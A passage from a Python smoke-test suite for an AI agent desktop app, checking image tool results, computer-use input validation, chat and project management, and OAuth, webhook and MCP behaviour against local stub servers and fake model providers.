    # Vision tool-results: a tool's _image reaches an image-capable model as an
    # image block, is stripped before storage, and never breaks a text-only model.
    import json as _vjson
    _vshot = {"path": "x.png", "width": 2, "height": 2,
              "_image": {"media_type": "image/png", "data": "QUJD"}}
    _vc = _re._tool_result_content(_vshot, _Caps(supports_image_tool_results=True))
    check("tool_result sends an image block to an image-capable model",
          isinstance(_vc, list) and any(b.get("type") == "image" for b in _vc)
          and _vc[-1]["source"]["data"] == "QUJD")
    _nc = _re._tool_result_content(_vshot, _Caps(supports_image_tool_results=False))
    check("tool_result falls back to text (no base64) for a text-only model",
          isinstance(_nc, str) and "QUJD" not in _nc and "path" in _nc)
    check("_strip_image keeps metadata but drops the base64 for storage",
          "_image" not in _re._strip_image(_vshot)
          and "QUJD" not in _vjson.dumps(_re._strip_image(_vshot)))
    from aria2.models.openai_provider import OpenAIProvider as _OAP
    _oai_msgs = _OAP._to_openai("sys", [{"role": "tool", "content": [
        {"type": "tool_result", "tool_use_id": "t1",
         "content": [{"type": "text", "text": "saw screen"},
                     {"type": "image", "source": {"type": "base64",
                      "media_type": "image/png", "data": "QUJD"}}]}]}])
    _toolmsg = [m for m in _oai_msgs if m.get("role") == "tool"][0]
    check("OpenAI translator drops image blocks from a tool result (text-only role)",
          _toolmsg["content"] == "saw screen")

    # Non-Anthropic vision models get the screenshot as a follow-up user message;
    # Anthropic (image-in-tool-result) and text-only models do not.
    _imgout = {"path": "x.png", "_image": {"media_type": "image/png", "data": "QUJD"}}
    _fu = _re._image_followup([_imgout],
                              _Caps(supports_vision=True, supports_image_tool_results=False))
    check("non-Anthropic vision model gets the screenshot as a follow-up user msg",
          _fu and _fu["role"] == "user"
          and any(b.get("type") == "image" and b["source"]["data"] == "QUJD"
                  for b in _fu["content"]))
    check("image-in-tool-result + text-only models get no image follow-up",
          _re._image_followup([_imgout],
                              _Caps(supports_vision=True, supports_image_tool_results=True)) is None
          and _re._image_followup([_imgout], _Caps(supports_vision=False)) is None)

    # Local (Ollama) runs estimate token usage instead of always reporting 0.
    from aria2.models.ollama_provider import _estimate_input_tokens as _eit
    check("ollama input-token estimate counts system + message text (not 0)",
          _eit("you are a helpful bot",
               [{"role": "user", "content": [{"type": "text", "text": "hello there friend"}]}]) > 1
          and _eit("sys", [{"role": "user", "content": "a plain string message"}]) > 1)

    # ── Computer-use tools: input validation + screenshot retention ───────────
    from aria2.runtime.tools.computer_tools import _prune_screenshots as _prune
    from aria2.runtime.tools.computer_tools import make_computer_tools as _mct
    _ctools = {t.name: t for t in _mct()}
    check("computer tools load (8) regardless of display/pyautogui availability",
          len(_ctools) == 8 and "mouse_click" in _ctools)
    check("mouse_click rejects an invalid button before acting",
          "Invalid button" in _ctools["mouse_click"].fn(button="banana").get("error", ""))
    check("type_text refuses an oversized payload",
          "too long" in _ctools["type_text"].fn(text="x" * 6000).get("error", ""))
    check("hotkey rejects a non-list keys argument",
          "non-empty list" in _ctools["hotkey"].fn(keys="ctrl").get("error", ""))
    import pathlib as _pl2
    import tempfile as _tf2
    _shdir = _pl2.Path(_tf2.mkdtemp())
    for _i in range(45):
        (_shdir / f"shot_s{_i:03d}.png").write_bytes(b"x")
    _prune(_shdir, keep=40)
    check("screenshot retention prunes to the newest N (no unbounded disk growth)",
          len(list(_shdir.glob("shot_*.png"))) == 40)

    from aria2.core import db as _db
    bt = _db.one("PRAGMA busy_timeout")
    check("db busy_timeout is set", bt is not None and bt[0] >= 5000)

    # ── Command palette filtering + onboarding readiness ──────────────────────
    from aria2.ui.views.command_palette import filter_commands
    cmds = [{"label": "Go to Chat", "hint": "view"},
            {"label": "New project", "hint": "action"},
            {"label": "Run eval self-test", "hint": "action"},
            {"label": "Check for updates", "hint": "action"}]
    r = filter_commands(cmds, "proj")
    check("command palette filters + ranks matches",
          r and r[0]["label"] == "New project")
    check("empty query returns the command list", len(filter_commands(cmds, "")) == 4)
    # /team and /loop are discoverable via the palette; selecting one prefills chat.
    from aria2.ui.views.command_palette import slash_command_entries
    _pf = []
    _slash = slash_command_entries(lambda p: _pf.append(p))
    check("palette surfaces /team + /loop and they prefill the composer",
          any("/team" in e["label"] for e in _slash)
          and any("/loop" in e["label"] for e in _slash)
          and [e["action"]() or _pf[-1] for e in _slash] and _pf == ["/team ", "/loop "])
    check("provider_configured: local is always ready",
          config.provider_configured({"provider": "local"}))
    check("provider_configured: claude needs a key",
          not config.provider_configured({"provider": "claude", "claude_api_key": ""})
          and config.provider_configured({"provider": "claude", "claude_api_key": "k"}))

    # ── Chat markdown rendering (parser tags, headless via a tk.Text) ─────────
    md_tags = _markdown_tags("# Title\nplain **bold** and `code`\n- item\n```\nx=1\n```")
    check("markdown renderer applies heading/bold/code/codeblock tags",
          {"h1", "bold", "code", "codeblock"} <= md_tags)

    # ── Chat file attachments ─────────────────────────────────────────────────
    import base64 as _b64
    import tempfile as _tf
    from pathlib import Path as _P
    tdir = _P(_tf.mkdtemp(prefix="aria2_attach_"))
    txtf = tdir / "notes.txt"
    txtf.write_text("hello attachment body", encoding="utf-8")
    # 1x1 transparent PNG
    png = tdir / "pix.png"
    png.write_bytes(_b64.b64decode(
        "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="))
    blocks = chat_service.build_user_content("look at these", [str(txtf), str(png)])
    text_join = " ".join(b.get("text", "") for b in blocks if b.get("type") == "text")
    check("attachment builder inlines text files",
          "notes.txt" in text_join and "hello attachment body" in text_join)
    img_blocks = [b for b in blocks if b.get("type") == "image"]
    check("attachment builder emits an image block",
          len(img_blocks) == 1 and img_blocks[0]["source"]["media_type"] == "image/png")
    # OpenAI-family translation carries the image as an image_url part.
    from aria2.models.openai_provider import OpenAIProvider
    oai = OpenAIProvider._to_openai("sys", [{"role": "user", "content": blocks}])
    user_msg = oai[-1]
    has_img_url = isinstance(user_msg["content"], list) and any(
        part.get("type") == "image_url" for part in user_msg["content"])
    check("OpenAI translation passes images as image_url parts", has_img_url)
    # End-to-end persist: a sent message stores the attachment blocks.
    achat = chat_service.create_chat(p["id"], agent_id=a["id"])
    chat_service._persist_message(achat["id"], "user",
                                  chat_service.build_user_content("hi", [str(txtf)]))
    stored = chat_service.list_messages(achat["id"])[-1]["content"]
    check("attachments persist in the message content",
          any("notes.txt" in b.get("text", "") for b in stored))

    # ── Tooltip helper (construct + show/hide headlessly) ─────────────────────
    check("tooltip helper attaches + shows/hides without error", _tooltip_ok())

    # ── Chat search / rename / delete ─────────────────────────────────────────
    sp = project_service.create("SearchProj")
    c_alpha = chat_service.create_chat(sp["id"])
    chat_service.rename_chat(c_alpha["id"], "Deployment notes")
    c_beta = chat_service.create_chat(sp["id"])
    chat_service.rename_chat(c_beta["id"], "Grocery list")
    chat_service._persist_message(c_beta["id"], "user",
                                  [{"type": "text", "text": "remember the deployment key"}])
    by_title = chat_service.search_chats(sp["id"], "deployment")
    check("chat search matches title and message content",
          {c_alpha["id"], c_beta["id"]} <= {c["id"] for c in by_title})
    only_grocery = chat_service.search_chats(sp["id"], "grocery")
    check("chat search narrows to title match",
          [c["id"] for c in only_grocery] == [c_beta["id"]])
    chat_service.rename_chat(c_alpha["id"], "Renamed")
    check("rename_chat updates the title",
          chat_service.get_chat(c_alpha["id"])["title"] == "Renamed")
    # delete_message removes a single message and reports its chat (for refresh).
    _dm1 = chat_service._persist_message(c_alpha["id"], "user", [{"type": "text", "text": "keep"}])
    _dm2 = chat_service._persist_message(c_alpha["id"], "user", [{"type": "text", "text": "drop"}])
    _dres = chat_service.delete_message(_dm2)
    _remain = [_m["id"] for _m in chat_service.list_messages(c_alpha["id"])]
    check("delete_message removes one message and returns its chat_id",
          _dres.get("chat_id") == c_alpha["id"]
          and _dm2 not in _remain and _dm1 in _remain
          and "error" in chat_service.delete_message("msg_does_not_exist"))
    chat_service.delete_chat(c_beta["id"])
    check("delete_chat removes the chat",
          chat_service.get_chat(c_beta["id"]) is None
          and len(chat_service.list_chats(sp["id"])) == 1)
    # Archive: hidden from the active list, visible in the archive, restorable.
    chat_service.archive_chat(c_alpha["id"], True)
    check("archive hides the chat from the active list",
          len(chat_service.search_chats(sp["id"])) == 0
          and len(chat_service.search_chats(sp["id"], include_archived=True)) == 1)
    chat_service.archive_chat(c_alpha["id"], False)
    check("unarchive restores the chat",
          len(chat_service.search_chats(sp["id"])) == 1)

    # ── Project archive / delete (default protected; delete cascades chats) ───
    check("default project is protected from delete/archive",
          "error" in project_service.delete("general")
          and "error" in project_service.archive("general"))
    project_service.archive(sp["id"], True)
    check("archived project hidden from default list, shown with include_archived",
          all(p["id"] != sp["id"] for p in project_service.list_projects())
          and any(p["id"] == sp["id"] for p in project_service.list_projects(include_archived=True)))
    project_service.archive(sp["id"], False)
    dp = project_service.create("DeleteMe")
    dc = chat_service.create_chat(dp["id"])
    project_service.delete(dp["id"])
    check("deleting a project cascades its chats",
          project_service.get(dp["id"]) is None
          and chat_service.get_chat(dc["id"]) is None)

    print("RESULT:", "PASS" if ok else "FAIL")
    return 0 if ok else 1


def _tooltip_ok() -> bool:
    import tkinter as tk
    import customtkinter as ctk
    from aria2.ui.views.widgets import add_tooltip
    root = ctk.CTk()
    root.withdraw()
    try:
        btn = ctk.CTkButton(root, text="x")
        btn.pack()
        tip = add_tooltip(btn, "hello tip")
        root.update()
        tip._show()       # force-show (bypass the hover delay)
        root.update()
        shown = tip._tip is not None
        tip._hide()
        root.update()
        return shown and tip._tip is None
    finally:
        root.destroy()


def _markdown_tags(md: str) -> set:
    """Render markdown into an offscreen tk.Text and return the tag names used."""
    import tkinter as tk
    from aria2.ui.views.bubble import _render_markdown
    root = tk.Tk()
    root.withdraw()
    try:
        t = tk.Text(root)
        _render_markdown(t, md)
        used = set()
        for tag in t.tag_names():
            if tag == "sel":
                continue
            if t.tag_ranges(tag):
                used.add(tag)
        return used
    finally:
        root.destroy()


def _blocks_text(content) -> str:
    if isinstance(content, str):
        return content
    return " ".join(b.get("text", "") for b in content if isinstance(b, dict))


def _provider_oauth_refresh(provider_auth, prefix: str) -> str:
    import threading, time as _t
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class T(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0) or 0)
            self.rfile.read(n)
            body = json.dumps({"access_token": "fresh-token", "expires_in": 3600}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), T)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    try:
        return provider_auth.ensure_token({
            f"{prefix}_auth_mode": "oauth", f"{prefix}_oauth_token": "old",
            f"{prefix}_oauth_expires": int(_t.time()) - 10,
            f"{prefix}_oauth_refresh": "r1", f"{prefix}_oauth_client_id": "c",
            f"{prefix}_oauth_token_url": f"http://127.0.0.1:{port}/token"}, prefix)
    finally:
        httpd.shutdown()


def _capture_system(extra_settings: dict, project, agent,
                    supports_tools: bool = True) -> str:
    """Run a stub engine turn and return the system prompt the model received."""
    captured = {"system": ""}

    class _Cap:
        name = "fake"

        def capabilities(self, model):
            from aria2.models.base import Capabilities
            return Capabilities(supports_tools=supports_tools, supports_caching=False)

        def count_tokens(self, text):
            return len(text) // 4

        def stream(self, model, system, messages, tools=None, max_tokens=4096,
                   temperature=1.0, cache=True):
            from aria2.models.base import StreamEvent
            captured["system"] = system
            yield StreamEvent(type="text", text="ok")
            yield StreamEvent(type="usage", usage={"input": 5, "output": 1})
            yield StreamEvent(type="done", stop_reason="end_turn")

    from aria2.models import registry as model_registry
    from aria2.runtime import run_engine
    orig = model_registry.for_settings
    model_registry.for_settings = lambda s, o=None: (_Cap(), "fake")
    try:
        engine = run_engine.RunEngine({**extra_settings, "prompt_caching": False,
                                       "delegation_enabled": False, "mcp_enabled": False,
                                       "max_iterations": 2})
        engine.execute(run_engine.RunRequest(
            agent=agent, project=project,
            messages=[{"role": "user", "content": [{"type": "text", "text": "hi"}]}],
            kind="chat"))
        return captured["system"]
    finally:
        model_registry.for_settings = orig


def _discord_server():
    """Inline server capturing webhook posts. Returns (hits_list, base_url)."""
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    hits: list[dict] = []

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0) or 0)
            self.rfile.read(n)
            hits.append({"path": self.path})
            self.send_response(204)
            self.end_headers()

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    return hits, f"http://127.0.0.1:{port}"


def _fetch_via_server(fetch_tool) -> dict:
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            body = b"<html><body><h1>hello-from-page</h1><script>x()</script></body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(body)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    try:
        return fetch_tool.fn(url=f"http://127.0.0.1:{port}/")
    finally:
        httpd.shutdown()


def _heartbeat_once(project, agent) -> dict:
    from aria2.core import config as _cfg
    from aria2.models import registry as model_registry
    from aria2.services import heartbeat_service
    orig = model_registry.for_settings
    model_registry.for_settings = lambda s, o=None: (_FakeProvider(), "fake")
    try:
        return heartbeat_service.run_once({
            "heartbeat_agent": agent["id"], "heartbeat_project": project["id"],
            "heartbeat_prompt": "check in", "prompt_caching": False,
            "delegation_enabled": False, "mcp_enabled": False, "max_iterations": 4})
    finally:
        model_registry.for_settings = orig


def _openai_oauth_refresh(openai_auth) -> str:
    import threading, time as _t
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class T(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0) or 0)
            self.rfile.read(n)
            body = json.dumps({"access_token": "fresh-token", "expires_in": 3600}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), T)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    try:
        return openai_auth.ensure_token({
            "openai_auth_mode": "oauth", "openai_oauth_token": "old",
            "openai_oauth_expires": int(_t.time()) - 10,
            "openai_oauth_refresh": "r1", "openai_oauth_client_id": "c",
            "openai_oauth_token_url": f"http://127.0.0.1:{port}/token"})
    finally:
        httpd.shutdown()


def _messaging_allowed_run() -> dict:
    """Run handle_message for an allowlisted sender against the stub provider."""
    from aria2.core import config as _cfg
    from aria2.models import registry as model_registry
    from aria2.services import messaging_service
    _cfg.set_key("telegram_allowlist", ["123"])
    _cfg.set_key("messaging_access", "chat_only")
    orig = model_registry.for_settings
    model_registry.for_settings = lambda s, o=None: (_FakeProvider(), "fake")
    try:
        return messaging_service.handle_message("hello bot", "123")
    finally:
        model_registry.for_settings = orig


def _check_update_via_server(update_service):
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            body = json.dumps({"version": "99.0.0", "url": "http://x/app.zip",
                               "notes": "test"}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    try:
        return update_service.check_for_update(f"http://127.0.0.1:{port}/manifest.json")
    finally:
        httpd.shutdown()


def _status_via_server(update_service, version: str, sha: str = ""):
    """Serve a manifest with the given version (+ optional sha256) and return
    check_status() against it."""
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            payload = {"version": version, "url": "http://x/app.zip", "notes": "test"}
            if sha:
                payload["sha256"] = sha
            body = json.dumps(payload).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    try:
        return update_service.check_status(f"http://127.0.0.1:{port}/manifest.json")
    finally:
        httpd.shutdown()


def _explore_variants(project):
    """Run two variant dry-runs via explore_service, commit one, return results."""
    from pathlib import Path
    from aria2.models import registry as model_registry
    from aria2.runtime.tools import permissions
    from aria2.services import explore_service

    permissions.set_approver(lambda *a: True)
    orig = model_registry.for_settings
    model_registry.for_settings = lambda s, o=None: (_WritingProvider(), "fake")
    try:
        results = explore_service.run_variants(
            project["id"], "create out.txt",
            [{"label": "A", "prompt": "create out.txt (A)"},
             {"label": "B", "prompt": "create out.txt (B)"}])
        target = Path(project["folder"]) / "out.txt"
        not_yet = not target.exists()  # nothing applied during exploration
        explore_service.commit_variant(results[0]["run_id"],
                                       [r["run_id"] for r in results])
        # target now exists from the committed variant; other overlay discarded.
        return results, (target if (not_yet and target.exists()) else Path(project["folder"]) / "missing")
    finally:
        model_registry.for_settings = orig


def _git_dry_run_commit(project_service, _re) -> bool:
    import subprocess
    import tempfile
    from pathlib import Path
    repo = tempfile.mkdtemp(prefix="aria2_gitproj_")
    def git(*a):
        return subprocess.run(["git", *a], cwd=repo, capture_output=True, text=True)
    if git("init").returncode != 0:
        return False  # git not available — skip gracefully
    git("config", "user.email", "a@b.c"); git("config", "user.name", "ARIA")
    (Path(repo) / "seed.txt").write_text("seed")
    git("add", "."); git("commit", "-m", "init")
    proj = project_service.create("GitProj", folder=repo)
    rid = _dry_run(proj)
    res = _re.commit_dry_run(rid, git_commit=True, message="aria test commit")
    log = subprocess.run(["git", "log", "--oneline"], cwd=repo, capture_output=True, text=True)
    return bool(res.get("git", {}).get("committed_sha")) and "aria test commit" in log.stdout


class _WritingProvider:
    """Stub: writes a file on turn 1 (captured by the overlay), finishes turn 2."""

    name = "fake"

    def __init__(self):
        self._turn = 0

    def capabilities(self, model):
        from aria2.models.base import Capabilities
        return Capabilities(supports_tools=True, supports_caching=False)

    def count_tokens(self, text):
        return len(text) // 4

    def stream(self, model, system, messages, tools=None, max_tokens=4096,
               temperature=1.0, cache=True):
        from aria2.models.base import StreamEvent
        self._turn += 1
        if self._turn == 1:
            yield StreamEvent(type="tool_use", tool_call={
                "id": "w1", "name": "write_file",
                "input": {"path": "out.txt", "content": "hello dry run"}})
            yield StreamEvent(type="usage", usage={"input": 50, "output": 10})
            yield StreamEvent(type="done", stop_reason="tool_use")
        else:
            yield StreamEvent(type="text", text="Would create out.txt.")
            yield StreamEvent(type="usage", usage={"input": 30, "output": 5})
            yield StreamEvent(type="done", stop_reason="end_turn")


def _dry_run(project) -> str:
    from aria2.models import registry as model_registry
    from aria2.runtime import run_engine
    from aria2.runtime.tools import permissions
    from aria2.services import agent_service

    permissions.set_approver(lambda *a: True)
    orig = model_registry.for_settings
    model_registry.for_settings = lambda s, o=None: (_WritingProvider(), "fake")
    try:
        engine = run_engine.RunEngine({"prompt_caching": False, "max_iterations": 5,
                                       "delegation_enabled": False, "mcp_enabled": False})
        req = run_engine.RunRequest(
            agent=agent_service.get("coder"), project=project,
            messages=[{"role": "user", "content": [{"type": "text",
                       "text": "create out.txt with hello dry run"}]}],
            kind="chat", dry_run=True,
        )
        return engine.execute(req).run_id
    finally:
        model_registry.for_settings = orig


def _oauth_refresh_works(mcp_oauth) -> bool:
    """Spin up a token endpoint and verify refresh() exchanges for a new token."""
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class T(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            n = int(self.headers.get("Content-Length", 0) or 0)
            self.rfile.read(n)
            body = json.dumps({"access_token": "fresh-token", "expires_in": 3600,
                               "refresh_token": "r2"}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), T)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    try:
        out = mcp_oauth.refresh({"refresh_token": "r1", "client_id": "c",
                                 "token_url": f"http://127.0.0.1:{port}/token"})
        return out.get("access_token") == "fresh-token"
    finally:
        httpd.shutdown()


def _start_http_mcp(required_token: str | None = None):
    """Inline MCP-over-HTTP (application/json) test server. Returns (httpd, url).
    If `required_token` is set, requests must carry a matching Bearer header."""
    import threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_POST(self):
            if required_token and self.headers.get("Authorization") != f"Bearer {required_token}":
                self.send_response(401); self.end_headers(); return
            n = int(self.headers.get("Content-Length", 0) or 0)
            msg = json.loads(self.rfile.read(n) or "{}")
            method, mid = msg.get("method"), msg.get("id")
            if method == "notifications/initialized":
                self.send_response(202); self.end_headers(); return
            if method == "initialize":
                result = {"protocolVersion": "2024-11-05", "capabilities": {"tools": {}},
                          "serverInfo": {"name": "http-echo", "version": "1.0"}}
            elif method == "tools/list":
                result = {"tools": [{"name": "echo", "description": "echo",
                                     "inputSchema": {"type": "object",
                                                     "properties": {"text": {"type": "string"}}}}]}
            elif method == "tools/call":
                txt = msg.get("params", {}).get("arguments", {}).get("text", "")
                result = {"content": [{"type": "text", "text": txt}], "isError": False}
            else:
                result = {}
            body = json.dumps({"jsonrpc": "2.0", "id": mid, "result": result}).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Mcp-Session-Id", "sess-1")
            self.end_headers()
            self.wfile.write(body)

    httpd = ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    port = httpd.server_address[1]
    return httpd, f"http://127.0.0.1:{port}/mcp"


def _hit_webhook(url: str) -> bool:
    import urllib.request

    from aria2.services import automation_service
    automation_service.webhook_server.start()
    time.sleep(0.3)
    try:
        req = urllib.request.Request(url, data=b'{"event":"deploy"}',
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode()
        return '"fired": true' in body or '"fired":true' in body
    except Exception:
        return False
    finally:
        automation_service.webhook_server.stop()


class _DelegatingProvider:
    """Supervisor stub: fans out two parallel sub-tasks on turn 1, then finishes.
    At max depth the delegate tool is absent, so the tree terminates safely."""

    name = "fake"

    def __init__(self):
        self._turn = 0

    def capabilities(self, model):
        from aria2.models.base import Capabilities
        return Capabilities(supports_tools=True, supports_caching=False)

    def count_tokens(self, text):
        return len(text) // 4

    def stream(self, model, system, messages, tools=None, max_tokens=4096,
               temperature=1.0, cache=True):
        from aria2.models.base import StreamEvent
        self._turn += 1
        tool_names = {t["name"] for t in (tools or [])}
        if self._turn == 1 and "delegate_parallel" in tool_names:
            yield StreamEvent(type="text", text="Coordinating specialists. ")
            yield StreamEvent(type="tool_use", tool_call={
                "id": "d1", "name": "delegate_parallel",
                "input": {"tasks": [
                    {"agent": "Researcher", "task": "research the market"},
                    {"agent": "Writer", "task": "write a short summary"},
                ]}})
            yield StreamEvent(type="usage", usage={"input": 80, "output": 30})
            yield StreamEvent(type="done", stop_reason="tool_use")
        else:
            yield StreamEvent(type="text", text="Synthesised results.")
            yield StreamEvent(type="usage", usage={"input": 40, "output": 10})
            yield StreamEvent(type="done", stop_reason="end_turn")


def _delegation_run(project) -> str:
    from aria2.models import registry as model_registry
    from aria2.runtime import run_engine
    from aria2.runtime.tools import permissions
    from aria2.services import agent_service

    permissions.set_approver(lambda *a: True)
    orig = model_registry.for_settings
    model_registry.for_settings = lambda s, o=None: (_DelegatingProvider(), "fake")
    try:
        engine = run_engine.RunEngine(
            {"delegation_enabled": True, "max_delegation_depth": 2,
             "prompt_caching": False, "max_iterations": 6}
        )
        req = run_engine.RunRequest(
            agent=agent_service.get("assistant"), project=project,
            messages=[{"role": "user", "content": [{"type": "text",
                       "text": "Produce a market brief."}]}],
            kind="chat", include_shell=False, depth=0,
        )
        return engine.execute(req).run_id
    finally:
        model_registry.for_settings = orig


def _forked_run(run_id: str) -> str:
    """Fork a run from step 1 using the fake provider, wait for completion."""
    from aria2.models import registry as model_registry
    from aria2.runtime.tools import permissions

    fake = _FakeProvider
    permissions.set_approver(lambda *a: True)
    orig = model_registry.for_settings
    model_registry.for_settings = lambda s, o=None: (fake(), "fake")
    try:
        new_id = run_service.fork_from_step(run_id, 1, edited_user_text="changed question?")
        for _ in range(50):
            r = run_service.get_run(new_id)
            if r and r["status"] not in ("running", "queued"):
                break
            time.sleep(0.05)
        return new_id
    finally:
        model_registry.for_settings = orig


class _FakeProvider:
    """Stub provider: asks for a tool on turn 1, finishes on turn 2. No API key."""

    name = "fake"

    def __init__(self):
        self._turn = 0

    def capabilities(self, model):
        from aria2.models.base import Capabilities

        return Capabilities(supports_tools=True, supports_caching=False)

    def count_tokens(self, text):
        return len(text) // 4

    def stream(self, model, system, messages, tools=None, max_tokens=4096,
               temperature=1.0, cache=True):
        from aria2.models.base import StreamEvent

        self._turn += 1
        if self._turn == 1:
            yield StreamEvent(type="text", text="Let me check memory. ")
            yield StreamEvent(type="tool_use",
                              tool_call={"id": "t1", "name": "recall",
                                         "input": {"query": "deploy"}})
            yield StreamEvent(type="usage", usage={"input": 100, "output": 20})
            yield StreamEvent(type="done", stop_reason="tool_use")
        else:
            yield StreamEvent(type="text", text="Done.")
            yield StreamEvent(type="usage", usage={"input": 120, "output": 5})
            yield StreamEvent(type="done", stop_reason="end_turn")


def _simulated_run(project, agent) -> str:
    """Drive RunEngine with the stub provider, no API key needed."""
    from aria2.models import registry as model_registry
    from aria2.runtime import run_engine
    from aria2.runtime.tools import permissions

    orig = model_registry.for_settings
    permissions.set_approver(lambda *a: True)  # auto-approve in headless test
    model_registry.for_settings = lambda s, o=None: (_FakeProvider(), "fake")
    try:
        engine = run_engine.RunEngine({"prompt_caching": False, "max_iterations": 5})
        req = run_engine.RunRequest(
            agent=agent, project=project,
            messages=[{"role": "user", "content": [{"type": "text", "text": "what about deploys?"}]}],
            kind="chat", include_shell=False,
        )
        result = engine.execute(req)
        return result.run_id
    finally:
        model_registry.for_settings = orig


if __name__ == "__main__":
    raise SystemExit(run_smoke())
